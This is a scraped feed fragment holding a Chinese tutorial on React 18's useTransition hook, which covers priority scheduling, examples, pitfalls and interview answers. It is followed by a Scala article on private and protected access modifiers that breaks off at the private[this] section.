                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<h2 data-id="heading-0">前言：为什么你的页面会“卡一下”？</h2>
<p>你一定遇到过这种情形：</p>
<ul>
<li>输入框一输入内容，页面卡顿 0.5 秒</li>
<li>切换 Tab 时，内容区域加载很久，UI“顿了一下”</li>
<li>搜索时，列表数据很多，界面直接“卡死两秒”</li>
</ul>
</blockquote>
<p>你可能会想：<br/>
“React 不是号称很快吗？怎么还卡？”</p>
<p>原因其实很简单：</p>
<blockquote>
<p><strong>React 会把所有状态更新一次性同步地渲染。你改了 state，它就赶紧渲染，不管这是不是紧急的。</strong></p>
</blockquote>
<p>所以如果你输入框触发的渲染很重（比如列表 5000 条），那输入就会卡。</p>
<p>为了给开发者更细粒度的控制——<br/>
React 提供了 <strong>useTransition</strong>。</p>
<p>它的核心目的就一句话：</p>
<blockquote>
<p><strong>让“不着急的更新，靠边站”，优先保证“着急的更新”不被卡住。</strong></p>
</blockquote>
<p>这个理念是 React18 之后“并发特性”的核心之一。</p>
<hr/>
<h2 data-id="heading-1">第一章：useTransition 到底是什么？</h2>
<h3 data-id="heading-2">1. 它不是加速器</h3>
<p>它不会让渲染更快，也不会减少计算量。</p>
<h3 data-id="heading-3">2. 它是“任务优先级调度器”</h3>
<p>把更新分成两类：</p>




















<table><thead><tr><th>类型</th><th>示例</th><th>特点</th></tr></thead><tbody><tr><td>🍎 <strong>Urgent（紧急更新）</strong></td><td>输入框输入、用户点击按钮、切换输入法</td><td>必须马上更新，否则卡顿</td></tr><tr><td>🍉 <strong>Transition（过渡更新）</strong></td><td>过滤列表、加载新界面、切换大视图，长列表重新渲染</td><td>可以延迟，不急</td></tr></tbody></table>
<p>用法：</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[isPending, startTransition]</span> = <span class="hljs-built_in">useTransition</span>()

<span class="hljs-built_in">startTransition</span>(() =&gt; {
  <span class="hljs-comment">// 这里面的更新会被标记为“非紧急”</span>
})
</code></pre>
<p>因此，React 会：</p>
<ul>
<li><strong>先处理紧急更新（保持 UI 流畅）</strong></li>
<li><strong>再“慢慢处理”这些不紧急的渲染</strong></li>
</ul>
<p>这就是 “不卡顿” 的根本原因。</p>
<hr/>
<h2 data-id="heading-4">🧪 第二章：极其直观的小白示例：为什么不卡？</h2>
<p>假设你做一个搜索过滤：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;input <span class="hljs-attr">value</span>={text} <span class="hljs-literal">on</span>Change={e =&gt; setText(e.target.value)} /&gt;
&lt;List <span class="hljs-attr">data</span>={filterBigList(text)} /&gt;
</code></pre>
<p><code>filterBigList(text)</code> 特别耗时<br/>
（比如几千条数据）</p>
<p>那么每次输入文字，都会：</p>
<ol>
<li>更新 text</li>
<li>filter 大数据列表</li>
<li>重新渲染大列表</li>
</ol>
<p>结果就是：</p>
<ul>
<li>输入法卡</li>
<li>页面卡</li>
<li>渲染跟不上用户输入</li>
</ul>
<p>现在用 useTransition：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = e =&gt; {
  <span class="hljs-keyword">const</span> v = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
  <span class="hljs-title function_">setText</span>(v);  <span class="hljs-comment">// 紧急更新，输入框动作必须马上反映</span>

  <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> { 
    <span class="hljs-title function_">setFiltered</span>(<span class="hljs-title function_">filterBigList</span>(v)); <span class="hljs-comment">// 不紧急</span>
  });
};
</code></pre>
<p>结果：</p>
<ul>
<li>输入框立刻更新（流畅）</li>
<li>filter 的计算被安排在低优先级，不阻塞 UI</li>
<li>列表先显示旧的，等计算完再显示新的</li>
</ul>
<hr/>
<h2 data-id="heading-5">⚡ 第三章：为什么 useTransition 能分类更新？</h2>
<p>因为 React18 有了 <strong>可中断渲染（interruptible rendering）</strong> 。</p>
<p>以前 React 是同步渲染：</p>
<blockquote>
<p>“你让我渲染 5000 条？那我开始做，等我做完才能响应用户输入。”</p>
</blockquote>
<p>现在是：</p>
<blockquote>
<p>“我先渲染你这一键的输入（紧急），至于你过滤列表那玩意儿，我稍后再弄，不着急。”</p>
</blockquote>
<p><strong>渲染任务可被提前打断，这是并发特性的核心。</strong></p>
<p>你按键的时候，React 认为“输入响应优先于渲染大列表”，所以它会：</p>
<ul>
<li>停 → 抛弃当前非紧急渲染</li>
<li>先做 → 输入框的 UI 更新</li>
<li>再做 → 非紧急渲染</li>
</ul>
<p>这就是 useTransition 的魔法来源。</p>
<hr/>
<h2 data-id="heading-6">🧩 第四章：useTransition 的详细用法与 API 解析</h2>
<h3 data-id="heading-7">4.1 基本使用</h3>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[isPending, startTransition]</span> = <span class="hljs-built_in">useTransition</span>();
</code></pre>
<h4 data-id="heading-8">🥝 <code>startTransition(fn)</code></h4>
<p>把 fn 内的状态更新变成非紧急。</p>
<h4 data-id="heading-9">🍋 <code>isPending</code></h4>
<p>表示“非紧急更新正在进行中”。</p>
<p>常用来显示 loading：</p>
<pre><code class="hljs language-css" lang="css">{isPending &amp;&amp; &lt;<span class="hljs-selector-tag">span</span>&gt;加载中...&lt;/<span class="hljs-selector-tag">span</span>&gt;}
</code></pre>
<hr/>
<h3 data-id="heading-10">4.2 示例完整版</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [query, setQuery] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [list, setList] = <span class="hljs-title function_">useState</span>(bigList);
  <span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = e =&gt; {
    <span class="hljs-keyword">const</span> v = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
    <span class="hljs-title function_">setQuery</span>(v);            <span class="hljs-comment">// 同步更新输入框</span>

    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> filtered = bigList.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-title function_">includes</span>(v));
      <span class="hljs-title function_">setList</span>(filtered);    <span class="hljs-comment">// 异步、延迟、不紧急</span>
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{query}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{handleChange}</span> /&gt;</span>
      {isPending &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
      <span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{list}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<hr/>
<h2 data-id="heading-11">🧬 第五章：三种情况下必须用 useTransition</h2>
<p>你只要看到下面三种情况，就应该考虑 useTransition。</p>
<hr/>
<h3 data-id="heading-12">5.1 情况一：输入框导致页面卡顿（最常见）</h3>
<p>场景：输入框 → 触发大量渲染 → 输入卡顿<br/>
解决：用 useTransition 把重渲染丢到低优先级。</p>
<hr/>
<h3 data-id="heading-13">5.2 情况二：Tab 切换导致大页面渲染</h3>
<p>比如切换 Tab 会渲染一个很大的组件：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">startTransition</span>(() =&gt; {
  <span class="hljs-built_in">setSelectedTab</span>(tab)
})
</code></pre>
<p>你会发现 UI 流畅得像没事一样。</p>
<hr/>
<h3 data-id="heading-14">5.3 情况三：长列表重新渲染</h3>
<p>长列表 + 过滤、切换排序、切换视图布局</p>
<p>这些都是非紧急更新 → 必用 useTransition。</p>
<hr/>
<h2 data-id="heading-15">🛑 第六章：useTransition 不适用的地方（容易踩坑）</h2>
<p>有些地方你绝不能用它！</p>
<hr/>
<h3 data-id="heading-16">❌ 6.1 表单真实值不能放在 transition 内更新</h3>
<p>错误：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">startTransition</span>(() =&gt; {
  <span class="hljs-built_in">setInputValue</span>(x)
})
</code></pre>
<p>结果：</p>
<ul>
<li>输入会延迟</li>
<li>React 故意“慢慢更新”</li>
</ul>
<p>正确：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">setInputValue</span>(x)
</code></pre>
<hr/>
<h3 data-id="heading-17">❌ 6.2 不能用于必须立即更新的 UI</h3>
<p>比如：</p>
<ul>
<li>提交表单结果</li>
<li>弹出 Modal</li>
<li>提示错误信息</li>
</ul>
<p>这些都属于“紧急更新”，不能延迟。</p>
<hr/>
<h2 data-id="heading-18">🔍 第七章：深入原理（可当面试题）</h2>
<p>面试官常问：</p>
<h4 data-id="heading-19">❓ useTransition 是如何实现“低优先级渲染”的？</h4>
<p>核心逻辑是：</p>
<ol>
<li>startTransition 内的更新会被标记为 <code>transition lane</code></li>
<li>React 在调度更新时，会根据 Lane 优先级调度</li>
<li>transition lane（低优先级）渲染时，可以被更高优先级任务中断</li>
<li>新任务进来后，低优先级渲染被丢弃</li>
<li>等紧急任务完成后，再继续低优先级任务</li>
</ol>
<p>也就是：</p>
<blockquote>
<p>任务优先级 + 可中断渲染 + Lane 模型 = useTransition</p>
</blockquote>
<hr/>
<h3 data-id="heading-20">❓ useTransition 和 useDeferredValue 差别？</h3>
<p>非常高频面试题！</p>

















<table><thead><tr><th>Hook</th><th>用途</th></tr></thead><tbody><tr><td><strong>useTransition</strong></td><td>把一段更新标记成低优先级</td></tr><tr><td><strong>useDeferredValue</strong></td><td>延迟一个值，不影响其余组件</td></tr></tbody></table>
<p>例子：</p>
<ul>
<li>搜索框：用 useDeferredValue</li>
<li>点击 Tab 切换大页面：用 useTransition</li>
<li>渲染大列表：都能用，但一般 prefer Transition</li>
</ul>
<hr/>
<h2 data-id="heading-21">💥 第八章：你见过最直观的示例：没有 useTransition vs 有 useTransition</h2>
<h3 data-id="heading-22">🎮 没用 useTransition</h3>
<p>你快速打字：</p>
<ul>
<li>输入框卡卡卡</li>
<li>CPU 占满</li>
<li>输入光标跳动卡顿</li>
</ul>
<h3 data-id="heading-23">🎠 用了 useTransition</h3>
<p>你快速打字：</p>
<ul>
<li>输入框始终流畅</li>
<li>列表稍后加载</li>
<li>UI 完全不卡</li>
</ul>
<p>这就是 <strong>优先级调度</strong> 的威力。</p>
<hr/>
<h2 data-id="heading-24">🎯 第九章：useTransition 的最佳实践（大厂常用写法）</h2>
<h4 data-id="heading-25">✔ 输入框里永远只放紧急更新</h4>
<h4 data-id="heading-26">✔ 大计算/大渲染一定放 transition</h4>
<h4 data-id="heading-27">✔ isPending 做 loading 占位</h4>
<h4 data-id="heading-28">✔ 列表多时，可搭配虚拟列表（react-window）</h4>
<h4 data-id="heading-29">✔ 不要过度使用，否则 UI 不同步反而奇怪</h4>
<hr/>
<h2 data-id="heading-30">🏁 结尾总结（最面试的那一句）</h2>
<p>如果面试官问你：</p>
<blockquote>
<p>React18 的 useTransition 有什么作用？</p>
</blockquote>
<p>你可以这样答：</p>
<blockquote>
<p><strong>它提供了一种把“不紧急渲染”放到低优先级执行的方式，依赖 React18 的并发特性和可中断渲染机制，通过 startTransition 包裹的更新可以被紧急任务打断，从而保证用户交互（如输入、点击）保持流畅。</strong></p>
</blockquote>
<p>一句话：</p>
<blockquote>
<p>useTransition 能让 UI 保持流畅，是因为 React18 引入了并发更新机制，允许状态更新根据优先级调度。被 startTransition 包裹的更新属于低优先级，渲染可以被中断、丢弃或延后执行，从而不阻塞高优先级的用户输入等交互任务。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Scala 访问权限详解：private、protected 与 private]]></title>    <link>https://juejin.cn/post/7575533124877762587</link>    <guid>https://juejin.cn/post/7575533124877762587</guid>    <pubDate>2025-11-24T02:05:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575533124877762587" data-draft-id="7575412016405479434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Scala 访问权限详解：private、protected 与 private"/> <meta itemprop="keywords" content="Scala,后端,编程语言"/> <meta itemprop="datePublished" content="2025-11-24T02:05:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="今天没有盐"/> <meta itemprop="url" content="https://juejin.cn/user/1408937846645355"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Scala 访问权限详解：private、protected 与 private
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1408937846645355/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    今天没有盐
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:05:25.000Z" title="Mon Nov 24 2025 02:05:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">导入</h2>
<p>在 Scala 面向对象编程中，访问权限控制是封装性的重要体现。通过合理的访问权限设置，可以保护类的内部状态，提高代码的安全性和可维护性。本文将详细讲解 Scala 中的三种主要访问权限：private、protected 和 private[this]，并通过具体代码示例展示它们的使用场景和区别。</p>
<h2 data-id="heading-1">一、private 访问权限</h2>
<h3 data-id="heading-2">定义</h3>
<p>private 是 Scala 中最严格的访问权限修饰符，用于限制成员只能在特定范围内访问。</p>
<h3 data-id="heading-3">语法特点</h3>
<ul>
<li>在类的内部可以访问</li>
<li>在类的外部不能访问</li>
<li>在伴生对象中可以访问</li>
</ul>
<h3 data-id="heading-4">示例：private 基本使用</h3>
<h4 data-id="heading-5">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">base3101</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">var name: <span class="hljs-type">String</span>, private var age: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span></span>(): <span class="hljs-type">Unit</span> = {
      println(<span class="hljs-string">s"<span class="hljs-subst">${this.age}</span>"</span>) <span class="hljs-comment">//（1）在类的内部可以访问。</span>
    }
  }

  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Student</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(student: <span class="hljs-type">Student</span>): <span class="hljs-type">Unit</span> = {
      println(student.age) <span class="hljs-comment">//（3）在伴生对象中可以访问。</span>
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-type">Student</span>(<span class="hljs-string">"小花"</span>, <span class="hljs-number">18</span>)
    s1.say()
    <span class="hljs-comment">// println(s1.age) // 报错。（2）在类的外部不能访问。</span>
    <span class="hljs-type">Student</span>.test(s1)
  }
}
</code></pre>
<h4 data-id="heading-6">结果展示</h4>
<pre><code class="hljs">18
18
</code></pre>
<h4 data-id="heading-7">代码分析</h4>
<ul>
<li>在 <code>Student</code> 类的 <code>say</code> 方法中，可以直接访问 <code>private var age</code>，体现了"在类的内部可以访问"</li>
<li>在 <code>main</code> 方法中，注释掉的 <code>println(s1.age)</code> 会编译报错，体现了"在类的外部不能访问"</li>
<li>在伴生对象 <code>Student</code> 的 <code>test</code> 方法中，可以访问 <code>student.age</code>，体现了"在伴生对象中可以访问"</li>
</ul>
<h2 data-id="heading-8">二、protected 访问权限</h2>
<h3 data-id="heading-9">定义</h3>
<p>protected 访问权限比 private 稍宽松，除了具备 private 的访问特性外，还允许在子类中访问。</p>
<h3 data-id="heading-10">语法特点</h3>
<ul>
<li>在类的内部可以访问</li>
<li>在类的外部不能访问</li>
<li>在伴生对象中可以访问</li>
<li>在子类中可以访问（与 private 的主要区别）</li>
</ul>
<h3 data-id="heading-11">示例：protected 与继承</h3>
<h4 data-id="heading-12">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">base3102</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">var name: <span class="hljs-type">String</span>, private var age: <span class="hljs-type">Int</span>, protected var weight: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span></span>(): <span class="hljs-type">Unit</span> = {
      println(<span class="hljs-string">s"<span class="hljs-subst">${this.age}</span>, <span class="hljs-subst">${this.weight}</span>"</span>) <span class="hljs-comment">//（1）在类的内部可以访问。</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sayAge</span></span>():<span class="hljs-type">Unit</span> = {println(age)}

    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sayWeight</span></span>():<span class="hljs-type">Unit</span> = { println(weight) }
  }
  
  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Student</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(student: <span class="hljs-type">Student</span>): <span class="hljs-type">Unit</span> = {
      println(student.weight) <span class="hljs-comment">//（3）在伴生对象中可以访问。</span>
    }
  }

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Major</span>(<span class="hljs-params">name: <span class="hljs-type">String</span>, age: <span class="hljs-type">Int</span>, weight: <span class="hljs-type">Int</span></span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">Student</span>(<span class="hljs-params">name, age, weight</span>) </span>{
    <span class="hljs-comment">// 在子类中通过 super来访问父类</span>
    <span class="hljs-comment">// sayAge()  // 报错（4）private修饰的，在子类中无法访问。</span>
    sayWeight() <span class="hljs-comment">// 正常（4）protected修饰的，在子类中可以访问。</span>
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-type">Student</span>(<span class="hljs-string">"小花"</span>, <span class="hljs-number">18</span>, <span class="hljs-number">100</span>)
    s1.say()
    <span class="hljs-comment">// println(s1.weight) // 报错。（2）在类的外部不能访问。</span>
    <span class="hljs-type">Student</span>.test(s1)
  }
}
</code></pre>
<h4 data-id="heading-13">结果展示</h4>
<pre><code class="hljs">18, 100
100
</code></pre>
<h4 data-id="heading-14">代码分析</h4>
<ul>
<li><code>Student</code> 类中有 private 的 <code>age</code>、protected 的 <code>weight</code> 和 <code>sayWeight</code> 方法</li>
<li>在 <code>Major</code> 子类中，<code>sayAge()</code> 调用会报错，因为 private 成员在子类中不可访问</li>
<li><code>sayWeight()</code> 调用正常执行，因为 protected 成员在子类中可以访问</li>
<li>在 <code>main</code> 方法中直接访问 <code>s1.weight</code> 会报错，体现了 protected 成员在类外部不可访问</li>
</ul>
<h2 data-id="heading-15">三、private[this] 访问权限</h2>
<h3 data-id="heading-16">定义</h3>
